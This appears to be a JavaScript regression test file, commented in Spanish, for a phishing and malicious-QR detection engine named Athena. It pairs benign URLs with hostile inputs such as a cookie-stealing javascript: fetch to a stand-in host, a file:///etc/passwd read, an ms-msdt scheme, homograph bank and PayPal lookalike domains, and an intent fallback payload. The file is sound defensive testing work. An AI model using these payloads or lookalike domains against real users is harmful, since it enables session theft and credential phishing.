/**
 * Athena · tests/casos.mjs
 * Banco de regresión del motor de detección.
 *
 *   node tests/casos.mjs          resumen
 *   node tests/casos.mjs -v       detalle de cada caso
 *
 * Cada caso declara el veredicto mínimo esperado y, opcionalmente, los
 * identificadores de hallazgo que deben aparecer. Añadir una regla nueva
 * sin añadir aquí su caso es dejarla sin red de seguridad.
 */

import { analizar, VEREDICTO } from '../js/analyzer.js';
import { crc16 } from '../js/lib/emv.js';

const ORDEN = { seguro: 0, precaucion: 1, sospechoso: 2, peligro: 3 };
const tag = (t, v) => t + String(v.length).padStart(2, '0') + v;

const emvBase =
  tag('00', '01') + tag('01', '11') +
  tag('26', tag('00', 'com.yappy.pa') + tag('01', '60001234')) +
  tag('52', '5411') + tag('53', '590') + tag('58', 'PA') +
  tag('59', 'TIENDA LA FE') + tag('60', 'PANAMA') +
  tag('62', tag('05', 'FAC-991')) + '6304';
const emvValido = emvBase + crc16(emvBase);
const emvAlterado = emvValido.replace('60001234', '69998877');

const CASOS = [

  /* ── Deben pasar limpios: falsos positivos son tan graves como fallos ── */
  ['https://www.google.com', 'seguro', 'seguro'],
  ['https://bancogeneral.com/banca-en-linea', 'seguro', 'seguro'],
  ['https://www.dgi.mef.gob.pa/consultas', 'seguro', 'seguro'],
  ['https://github.com/mob949k/MOONLAB', 'seguro', 'seguro'],
  ['Reunión de padres el jueves a las 3:00 p.m.', 'seguro', 'seguro'],
  ['mailto:contacto@ejemplo.com', 'seguro', 'seguro'],
  ['geo:8.9824,-79.5199', 'seguro', 'seguro'],
  ['https://es.wikipedia.org/wiki/Teorema_de_Bayes', 'seguro', 'seguro'],
  ['tel:+50762001234', 'seguro', 'seguro'],
  ['https://meduca.gob.pa/calendario-escolar-2026', 'seguro', 'seguro'],

  /* ── Esquemas ejecutables ── */
  ['javascript:fetch("https://x.tk/?c="+document.cookie)', 'peligro', 'peligro', ['esquema-ejecutable']],
  ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', 'peligro', 'peligro', ['data-activo']],
  ['vbscript:msgbox(1)', 'peligro', 'peligro'],
  ['file:///etc/passwd', 'peligro', 'peligro'],
  ['ms-msdt:/id PCWDiagnostic', 'peligro', 'peligro'],

  /* ── Homógrafos y suplantación ── */
  ['https://www.gооgle.com/accounts', 'peligro', 'peligro', ['mezcla-escrituras']],
  ['https://раураl.com/login', 'peligro', 'peligro', ['suplantacion-marca']],
  ['https://xn--80ak6aa92e.com/verify', 'peligro', 'peligro', ['punycode', 'suplantacion-marca']],
  ['https://bancogenera1.com/acceso', 'peligro', 'peligro', ['suplantacion-marca']],
  ['https://rnicrosoft.com/login', 'peligro', 'peligro', ['suplantacion-marca']],
  ['https://banistrno.com.pa', 'sospechoso', 'peligro', ['suplantacion-marca']],
  ['https://yappy-pagos.com/cobro', 'peligro', 'peligro', ['suplantacion-marca']],
  ['https://bancogeneral.com.verificar.xyz/login', 'peligro', 'peligro', ['tld-en-subdominio']],
  ['https://login.bancogeneral.com.seguro-pa.tk/', 'peligro', 'peligro'],
  ['https://secure-panapass-recarga.click/pago', 'sospechoso', 'peligro'],
  ['https://ejemplo.com/paypal/verify-account', 'sospechoso', 'peligro', ['marca-fuera-del-dominio']],

  /* ── Ofuscación ── */
  ['https://bancogeneral.com@evil-host.tk/pago', 'peligro', 'peligro', ['credenciales-url']],
  ['http://2130706433/panel', 'sospechoso', 'peligro', ['ip-ofuscada']],
  ['http://0x7f000001/admin', 'sospechoso', 'peligro', ['ip-ofuscada']],
  ['https://ejemplo.com/x?u=aHR0cHM6Ly9iYW5jby1mYWxzby50ay9sb2dpbg==', 'sospechoso', 'peligro', ['base64-param']],
  ['https://ejemplo.com/r?redirect=https%3A%2F%2Fраураl.com%2Flogin', 'peligro', 'peligro', ['redireccion-param']],
  ['https://ejemplo.com/#https://banco-falso.tk/login', 'sospechoso', 'peligro', ['url-en-fragmento']],
  ['https://ejem\u200Bplo.com/login', 'peligro', 'peligro', ['invisibles']],
  ['https://google\u3002com.evil.tk/', 'peligro', 'peligro', ['separadores-falsos']],
  ['https://ejemplo.com/f?p=%252E%252E%252Fadmin', 'sospechoso', 'peligro', ['doble-codificacion']],

  /* ── Infraestructura ── */
  ['http://192.168.1.44/router', 'precaucion', 'sospechoso', ['sin-tls', 'host-ip']],
  ['https://banco-verificacion.vercel.app/acceso', 'sospechoso', 'peligro', ['plataforma-gratuita']],
  ['https://cobro-yappy.ngrok-free.app/', 'sospechoso', 'peligro'],
  ['https://premios2026.tk/reclamar', 'sospechoso', 'peligro', ['tld-abuso-alto']],
  ['https://xk29fbqzlmwr7vd3.top/a', 'sospechoso', 'peligro', ['nombre-generado']],
  ['https://bit.ly/3xR2fQ', 'precaucion', 'sospechoso', ['acortador']],
  ['https://ejemplo.com:8443/panel', 'precaucion', 'sospechoso', ['puerto-inusual']],

  /* ── Carga ── */
  ['https://cdn.ejemplo.com/actualizacion.apk', 'sospechoso', 'peligro', ['descarga-ejecutable']],
  ['https://ejemplo.com/factura.pdf.exe', 'peligro', 'peligro', ['doble-extension']],
  ['https://ejemplo.com/planilla.xlsm', 'precaucion', 'sospechoso', ['documento-macro']],
  ['https://ejemplo.com/entrar?password=hola123', 'precaucion', 'sospechoso', ['param-sensible']],
  ['intent://pagar#Intent;scheme=https;package=com.mal;S.browser_fallback_url=https%3A%2F%2Fbanco-falso.tk;end',
    'sospechoso', 'peligro', ['intent-respaldo']],

  /* ── Ingeniería social ── */
  ['https://actualiza-tu-cuenta-ahora.online/verificar', 'sospechoso', 'peligro', ['cebo']],
  ['https://ganaste-un-premio.xyz/reclamar-bono', 'sospechoso', 'peligro', ['cebo']],

  /* ── Pago ── */
  [emvValido, 'precaucion', 'sospechoso', ['emv-crc-valido', 'emv-estatico']],
  [emvAlterado, 'peligro', 'peligro', ['emv-crc-invalido']],
  ['bitcoin:1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa?amount=0.05', 'precaucion', 'sospechoso', ['cripto-pago']],
  ['bitcoin:noesunadireccion?amount=1', 'sospechoso', 'peligro', ['cripto-formato']],

  /* ── Wi-Fi ── */
  ['WIFI:T:nopass;S:WiFi_Gratis_Aeropuerto;;', 'sospechoso', 'peligro', ['wifi-abierta', 'wifi-cebo']],
  ['WIFI:T:WPA;S:CasaMedina;P:UnaClaveLargaYBuena;;', 'seguro', 'precaucion'],
  ['WIFI:T:WEP;S:OficinaVieja;P:12345;;', 'sospechoso', 'peligro', ['wifi-wep']],

  /* ── Otros ── */
  ['SMSTO:3344:PREMIO', 'sospechoso', 'peligro', ['sms-suscripcion']],
  ['tel:+18095551234', 'sospechoso', 'peligro', ['tel-premium']],
  ['BEGIN:VCARD\nFN:Soporte\nURL:https://soporte-banco.tk/verificar\nEND:VCARD', 'sospechoso', 'peligro'],
  ['abandon ability able about above absent absorb abstract absurd abuse access accident',
    'sospechoso', 'peligro', ['texto-semilla']]
];

/* ─────────────────────────── Ejecución ─────────────────────────── */

const verboso = process.argv.includes('-v');
let ok = 0, fallos = [];

for (const [entrada, minimo, maximo, esperados = []] of CASOS) {
  const r = analizar(entrada);
  const problemas = [];

  if (ORDEN[r.veredicto] < ORDEN[minimo]) problemas.push(`veredicto ${r.veredicto} < mínimo ${minimo}`);
  if (ORDEN[r.veredicto] > ORDEN[maximo]) problemas.push(`veredicto ${r.veredicto} > máximo ${maximo}`);

  const ids = new Set(r.hallazgos.map(h => h.id));
  const anidIds = new Set(r.anidados.flatMap(a => a.hallazgos.map(h => h.id)));
  for (const id of esperados) {
    if (!ids.has(id) && !anidIds.has(id)) problemas.push(`falta el hallazgo «${id}»`);
  }

  const marca = problemas.length ? '✗' : '✓';
  if (problemas.length) fallos.push([entrada, problemas, r]); else ok++;

  if (verboso || problemas.length) {
    console.log(`${marca} [${r.veredicto.padEnd(10)} ${String(r.puntaje).padStart(3)}] ${entrada.slice(0, 62)}`);
    for (const p of problemas) console.log(`     ↳ ${p}`);
    if (verboso) {
      for (const g of r.tacticas) {
        console.log(`     · ${g.nombre}: ${g.hallazgos.map(h => h.id).join(', ')}`);
      }
      for (const a of r.anidados) {
        console.log(`     ↳ anidado [${a.veredicto} ${a.puntaje}] ${a.bruto.slice(0, 46)}`);
      }
    }
  }
}

console.log(`\n${ok}/${CASOS.length} casos correctos`);
if (fallos.length) {
  console.log(`${fallos.length} fallo(s).`);
  process.exitCode = 1;
}
